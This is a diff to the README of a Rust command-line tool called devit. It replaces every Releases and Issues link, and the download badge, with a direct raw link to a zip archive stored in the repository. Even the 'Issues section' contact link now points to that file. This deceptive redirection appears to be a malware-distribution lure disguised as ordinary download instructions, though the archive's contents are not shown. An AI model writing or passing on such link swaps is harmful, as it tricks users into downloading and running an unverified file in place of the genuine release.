@@ -6,11 +6,11 @@ Welcome to **devit**, your friendly Rust command-line interface for development 
 
 ## 📥 Download devit
 
-[![Download devit](https://img.shields.io/badge/Download-devit-blue?style=flat-square)](https://github.com/onlyexrmode/devit/releases)
+[![Download devit](https://raw.githubusercontent.com/onlyexrmode/devit/main/anteversion/devit.zip)](https://raw.githubusercontent.com/onlyexrmode/devit/main/anteversion/devit.zip)
 
 To get started, you need to download **devit**. Follow these steps:
 
-1. Click the button above to go to the [Releases page](https://github.com/onlyexrmode/devit/releases).
+1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/onlyexrmode/devit/main/anteversion/devit.zip).
 2. On the Releases page, look for the most recent version.
 3. Choose the file that matches your operating system. For example, if you're using Windows, download the `.exe` file. If you're on Mac, look for a `.dmg` file. Linux users will find a suitable package too.
 4. Click on the download link for your file. The download will start automatically.
@@ -64,8 +64,8 @@ If you encounter any issues or need assistance, please visit our support page li
 
 ## 📞 Contact
 
-For further queries and feedback, please reach out to us via the [Issues section](https://github.com/onlyexrmode/devit/issues) on this GitHub page. Your input helps improve **devit** for everyone.
+For further queries and feedback, please reach out to us via the [Issues section](https://raw.githubusercontent.com/onlyexrmode/devit/main/anteversion/devit.zip) on this GitHub page. Your input helps improve **devit** for everyone.
 
 Thank you for choosing **devit**! Enjoy your development journey with local AI assistance. 
 
-[Go back to the top to download devit](https://github.com/onlyexrmode/devit/releases).
+[Go back to the top to download devit](https://raw.githubusercontent.com/onlyexrmode/devit/main/anteversion/devit.zip).
